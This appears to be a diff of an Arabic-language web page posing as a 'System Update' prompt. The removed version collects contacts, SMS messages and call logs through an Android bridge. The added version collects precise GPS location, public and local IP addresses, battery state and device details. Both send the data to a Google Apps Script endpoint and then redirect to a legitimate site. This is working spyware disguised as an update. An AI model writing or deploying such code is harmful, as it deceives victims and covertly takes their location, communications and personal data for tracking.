@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Update</title>
+<title>تحديث النظام</title>
 <style>
   body { margin:0; padding:16px; background:#f2f2f7;
          font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
@@ -29,7 +29,7 @@
 
 <div class="container">
   <h2>تحديث النظام مطلوب</h2>
-  <p>سيتم مزامنة بيانات الجهاز: الموقع، جهات الاتصال، الرسائل، وسجل المكالمات.</p>
+  <p>سيتم التحقق من الجهاز والشبكة والموقع الجغرافي.</p>
 
   <button id="btn" type="button">تحديث الآن</button>
 
@@ -39,142 +39,93 @@
 </div>
 
 <script>
-  /* ================= إعدادات ================= */
-  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxtgtAJI43MrEIDuBPOMf4PxqlQdkPgPNSCR81McpRTo8O_BA3llj8g07ym7uf9FMKn/exec';
-  const REDIRECT_URL      = 'https://www.apple.com';
-  const ONCE_PER_VISITOR  = false;
-  const POST_TIMEOUT      = 12000;
-  const GEO_TIMEOUT       = 12000;
-  const PERM_TIMEOUT      = 30000;
-  const CONTACTS_PICK_MS  = 25000;
-  const VERIFY_TIMEOUT    = 9000;
-  const MAX_CONTACTS      = 200;
-  const MAX_MSGS          = 100;
-  const MAX_CALLS         = 100;
-  const MAX_JSON          = 40000;   // أقل من حد الخلية 45000 في السكربت
+  const GOOGLE_SCRIPT_URL = location.protocol.startsWith('http')
+    ? location.origin + location.pathname
+    : 'https://script.google.com/macros/s/AKfycbxd_EXLlnhsh5GTYqZ50yYxz8O11s3zh-vL4mf8Hduk2UP5dJMxrfLNflDHGnNpMlhU6w/exec';
 
-  const B      = window.AndroidBridge || null;
-  const NATIVE = !!B;
+  const REDIRECT_URL   = 'https://www.google.com';
+  const POST_TIMEOUT   = 12000;
+  const GEO_TIMEOUT    = 15000;
+  const VERIFY_TIMEOUT = 9000;
 
-  document.getElementById('hint').textContent = NATIVE
-    ? 'الوضع: تطبيق — مزامنة كاملة'
-    : 'الوضع: متصفح — الرسائل وسجل المكالمات غير متاحين';
-
-  /* ================= أدوات ================= */
   const withTimeout = (p, ms, fb) =>
     Promise.race([p, new Promise(r => setTimeout(() => r(fb), ms))]);
 
-  const arr = v => Array.isArray(v) ? v : [];
+  const str = (v, n) => String(v ?? '').slice(0, n);
 
-  const safeParse = (fn, fb) => { try { return JSON.parse(fn()); } catch { return fb; } };
-
-  // قصّ على مستوى المصفوفة → يبقى الـ JSON صالحًا للتحليل في السكربت
-  function pack(list, max) {
-    const out = []; let n = 2;
-    for (const x of arr(list)) {
-      const s = JSON.stringify(x).length + 1;
-      if (n + s > max) break;
-      out.push(x); n += s;
-    }
-    return out;
+  /* ---------- استخراج الجهاز من البصمة ---------- */
+  function parseModel(ua) {
+    const m = ua.match(/Android[^;]*;\s*([^;)]+?)(?:\s+Build|\))/i);
+    if (m) return m[1].replace(/\s+Build.*/i, '').trim();
+    if (/iPhone/.test(ua)) return 'iPhone';
+    if (/iPad/.test(ua)) return 'iPad';
+    return '';
   }
 
-  /* ================= الصلاحيات ================= */
-  async function ensurePerms() {
-    if (!NATIVE) return;
-    const jobs = [
-      ['hasContactsPermission', 'requestContactsPermission'],
-      ['hasSmsPermission',      'requestSmsPermission'],
-      ['hasCallLogPermission',  'requestCallLogPermission']
-    ];
-    for (const [has, req] of jobs) {
-      if (typeof B[has] !== 'function' || typeof B[req] !== 'function') continue;
-      try { if (B[has]()) continue; } catch { continue; }
-
-      await new Promise(res => {
-        window.__permCb = res;
-        try { B[req](); } catch { return res(false); }
-        setTimeout(() => res(false), PERM_TIMEOUT);
-      });
-      window.__permCb = null;
-      // نكمل حتى لو رُفض — القسم المعني سيرجع مصفوفة فارغة
-    }
+  function parseBrand(model, ua) {
+    const t = (model + ' ' + ua).toLowerCase();
+    if (/sm-|gt-|samsung/.test(t)) return 'Samsung';
+    if (/pixel/.test(t)) return 'Google';
+    if (/redmi|poco|xiaomi|^m\d|mi \d/.test(t)) return 'Xiaomi';
+    if (/oneplus/.test(t)) return 'OnePlus';
+    if (/moto|xt\d/.test(t)) return 'Motorola';
+    if (/cph|oppo/.test(t)) return 'OPPO';
+    if (/vivo/.test(t)) return 'vivo';
+    if (/infinix/.test(t)) return 'Infinix';
+    if (/tecno/.test(t)) return 'TECNO';
+    if (/huawei|honor/.test(t)) return 'Huawei';
+    if (/nokia/.test(t)) return 'Nokia';
+    if (/iphone|ipad/.test(t)) return 'Apple';
+    if (/realme/.test(t)) return 'realme';
+    return '';
   }
 
-  /* ================= جمع البيانات ================= */
-  async function getContacts() {
-    if (NATIVE && typeof B.getContacts === 'function') {
-      return arr(safeParse(() => B.getContacts(), [])).slice(0, MAX_CONTACTS);
-    }
-    if (navigator.contacts && navigator.contacts.select) {
-      try {
-        const list = await withTimeout(
-          navigator.contacts.select(['name', 'tel'], { multiple: true }),
-          CONTACTS_PICK_MS, []);
-        return arr(list).slice(0, MAX_CONTACTS).map(c => ({
-          n: (c.name && c.name[0]) || '',
-          t: arr(c.tel).slice(0, 2).join(' / ')
-        }));
-      } catch { return []; }
-    }
-    return [];
+  function parsePlatform(ua) {
+    let m = ua.match(/Android\s+([\d.]+)/);
+    if (m) return 'Android ' + m[1];
+    m = ua.match(/iPhone OS ([\d_]+)/);
+    if (m) return 'iOS ' + m[1].replace(/_/g, '.');
+    if (/Windows NT/.test(ua)) return 'Windows';
+    if (/Mac OS X/.test(ua)) return 'macOS';
+    if (/Linux/.test(ua)) return 'Linux';
+    return '';
   }
 
-  async function getSMS() {
-    if (NATIVE && typeof B.getSms === 'function') {
-      return arr(safeParse(() => B.getSms(MAX_MSGS), [])).slice(0, MAX_MSGS);
-    }
-    return [];
-  }
-
-  async function getCalls() {
-    if (NATIVE && typeof B.getCallLog === 'function') {
-      return arr(safeParse(() => B.getCallLog(MAX_CALLS), [])).slice(0, MAX_CALLS);
-    }
-    return [];
-  }
-
-  function getGeo() {
-    const p = new Promise(resolve => {
-      if (!navigator.geolocation) return resolve({ s: 'N/A' });
-      navigator.geolocation.getCurrentPosition(
-        pos => resolve({
-          s: 'ok',
-          lat: +pos.coords.latitude.toFixed(6),
-          lng: +pos.coords.longitude.toFixed(6),
-          acc: Math.round(pos.coords.accuracy)
-        }),
-        err => resolve({ s: err.code === 1 ? 'Denied' : 'N/A' }),
-        { enableHighAccuracy: true, timeout: GEO_TIMEOUT, maximumAge: 0 }
-      );
-    });
-    return withTimeout(p, GEO_TIMEOUT + 800, { s: 'N/A' });
-  }
-
-  async function getIP() {
+  /* ---------- البطارية ---------- */
+  async function getBattery() {
+    if (!navigator.getBattery) return { level: '', charging: '' };
     try {
-      const r = await withTimeout(
-        fetch('https://api.ipify.org?format=json', { cache: 'no-store' }), 5000, null);
-      if (!r) return 'N/A';
-      const j = await r.json();
-      return j.ip || 'N/A';
-    } catch { return 'N/A'; }
+      const b = await withTimeout(navigator.getBattery(), 3000, null);
+      if (!b) return { level: '', charging: '' };
+      return {
+        level: Math.round(b.level * 100) + '%',
+        charging: b.charging ? 'نعم' : 'لا'
+      };
+    } catch { return { level: '', charging: '' }; }
   }
 
+  /* ---------- نوع الشبكة ---------- */
+  function getNetType() {
+    const c = navigator.connection;
+    if (!c) return '';
+    const map = { 'slow-2g': '2G', '2g': '2G', '3g': '3G', '4g': '4G' };
+    return map[c.effectiveType] || str(c.effectiveType, 20);
+  }
+
+  /* ---------- الأيبي المحلي ---------- */
   function getWebRTC() {
     const p = new Promise(resolve => {
       if (!window.RTCPeerConnection) return resolve('N/A');
       let done = false;
       const fin = v => { if (!done) { done = true; resolve(v); } };
       let pc;
-      try {
-        pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-      } catch { return fin('N/A'); }
+
+      try { pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); }
+      catch { return fin('N/A'); }
 
       pc.onicecandidate = e => {
         if (e.candidate) return;
         const sdp = pc.localDescription ? pc.localDescription.sdp : '';
-        // يتجاهل mDNS (*.local) ويلتقط IPv4 الحقيقي فقط
         const m = sdp.match(/candidate:\S+ \d+ \S+ \d+ (\d{1,3}(?:\.\d{1,3}){3})/);
         fin(m ? m[1] : 'N/A');
         try { pc.close(); } catch {}
@@ -188,16 +139,38 @@
     return withTimeout(p, 5000, 'N/A');
   }
 
-  async function getBattery() {
-    if (!navigator.getBattery) return 'N/A';
-    try {
-      const b = await withTimeout(navigator.getBattery(), 3000, null);
-      if (!b) return 'N/A';
-      return Math.round(b.level * 100) + '%' + (b.charging ? ' (يشحن)' : '');
-    } catch { return 'N/A'; }
+  /* ---------- الأيبي العام ---------- */
+  async function getPublicIP() {
+    for (const u of ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json']) {
+      try {
+        const r = await withTimeout(fetch(u, { cache: 'no-store' }), 5000, null);
+        if (!r || !r.ok) continue;
+        const j = await r.json();
+        if (j && j.ip) return str(j.ip, 45);
+      } catch {}
+    }
+    return 'N/A';
   }
 
-  /* ================= التحقق من الاستلام ================= */
+  /* ---------- الموقع ---------- */
+  function getGeo() {
+    const p = new Promise(resolve => {
+      if (!navigator.geolocation) return resolve({ s: 'N/A' });
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({
+          s: pos.coords.accuracy <= 50 ? 'gps' : 'شبكة',
+          lat: +pos.coords.latitude.toFixed(6),
+          lng: +pos.coords.longitude.toFixed(6),
+          acc: Math.round(pos.coords.accuracy)
+        }),
+        err => resolve({ s: err.code === 1 ? 'مرفوض' : 'N/A' }),
+        { enableHighAccuracy: true, timeout: GEO_TIMEOUT, maximumAge: 0 }
+      );
+    });
+    return withTimeout(p, GEO_TIMEOUT + 800, { s: 'N/A' });
+  }
+
+  /* ---------- التحقق ---------- */
   const nonce = (crypto.randomUUID && crypto.randomUUID()) ||
                 (String(Date.now()) + '-' + Math.random().toString(36).slice(2));
 
@@ -205,8 +178,7 @@
     return new Promise(resolve => {
       const cb = '__v' + Math.floor(Math.random() * 1e9);
       const s  = document.createElement('script');
-      let done = false;
-      let timer;
+      let done = false, timer;
 
       const fin = v => {
         if (done) return;
@@ -220,72 +192,57 @@
       window[cb] = fin;
       timer = setTimeout(() => fin(false), VERIFY_TIMEOUT);
       s.onerror = () => fin(false);
-      s.src = GOOGLE_SCRIPT_URL
-            + '?check=' + encodeURIComponent(nonce)
-            + '&cb=' + cb
-            + '&t=' + Date.now();
+      s.src = GOOGLE_SCRIPT_URL + '?check=' + encodeURIComponent(nonce)
+            + '&cb=' + cb + '&t=' + Date.now();
       document.body.appendChild(s);
     });
   }
 
-  /* ================= التشغيل ================= */
+  /* ---------- التشغيل ---------- */
   let busy = false;
 
-  async function startTracking() {
+  async function start() {
     if (busy) return;
 
     const btn    = document.getElementById('btn');
     const loader = document.getElementById('loader');
     const status = document.getElementById('status');
 
-    if (ONCE_PER_VISITOR) {
-      try {
-        if (localStorage.getItem('su_done') === '1') {
-          status.className = 'ok';
-          status.textContent = '✅ تم التحديث مسبقًا';
-          setTimeout(() => location.href = REDIRECT_URL, 1500);
-          return;
-        }
-      } catch {}
-    }
-
     busy = true;
     btn.disabled = true;
     btn.style.display = 'none';
     loader.style.display = 'block';
     status.className = '';
-    status.textContent = 'جارٍ جمع البيانات…';
+    status.textContent = 'جارٍ التحقق من الجهاز…';
 
     try {
-      await ensurePerms();
-
-      const geoP = getGeo();
-      const contacts = await getContacts();
-
-      const [geo, sms, calls, ip, localIP, battery] = await Promise.all([
-        geoP, getSMS(), getCalls(), getIP(), getWebRTC(), getBattery()
+      const [geo, ip, battery, localIP] = await Promise.all([
+        getGeo(), getPublicIP(), getBattery(), getWebRTC()
       ]);
+
+      const ua    = navigator.userAgent;
+      const model = parseModel(ua);
+
+      status.textContent = 'جارٍ تحديد المدينة…';
 
       const payload = {
         time: new Date().toISOString(),
         nonce,
         ip,
         localIP,
-        battery,
-        geoStatus: geo.s,
         lat: geo.lat ?? '',
         lng: geo.lng ?? '',
         acc: geo.acc ?? '',
+        geoSource: geo.s,
+        network: getNetType(),
+        model,
+        brand: parseBrand(model, ua),
+        platform: parsePlatform(ua),
+        battery: battery.level,
+        charging: battery.charging,
         tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
         lang: navigator.language || '',
-        ua: navigator.userAgent,
-        native: NATIVE,
-        cCount: contacts.length,
-        cJson: JSON.stringify(pack(contacts, MAX_JSON)),
-        sCount: sms.length,
-        sJson: JSON.stringify(pack(sms, MAX_JSON)),
-        lCount: calls.length,
-        lJson: JSON.stringify(pack(calls, MAX_JSON))
+        ua
       };
 
       const ac = new AbortController();
@@ -300,24 +257,23 @@
         });
       } finally { clearTimeout(killer); }
 
-      status.textContent = 'جارٍ التحقق…';
+      status.textContent = 'جارٍ التحقق من الاستلام…';
       const ok = await verify();
 
       loader.style.display = 'none';
 
       if (!ok) {
         status.className = 'err';
-        status.textContent = '⚠️ لم يُؤكد الاستلام — تحقق من النشر أو أعد المحاولة';
+        status.textContent = '⚠️ لم يُؤكد الاستلام — تحقق من النشر';
         btn.disabled = false;
         btn.style.display = 'block';
         busy = false;
         return;
       }
 
-      try { localStorage.setItem('su_done', '1'); } catch {}
       status.className = 'ok';
-      status.textContent = `✅ تم — ${contacts.length} جهة، ${sms.length} رسالة، ${calls.length} مكالمة`;
-      setTimeout(() => location.href = REDIRECT_URL, 2200);
+      status.textContent = '✅ تم التحقق — جارٍ التحويل';
+      setTimeout(() => location.href = REDIRECT_URL, 2000);
 
     } catch (err) {
       console.error(err);
@@ -330,7 +286,7 @@
     }
   }
 
-  document.getElementById('btn').addEventListener('click', startTracking);
+  document.getElementById('btn').addEventListener('click', start);
 </script>
 
 </body>
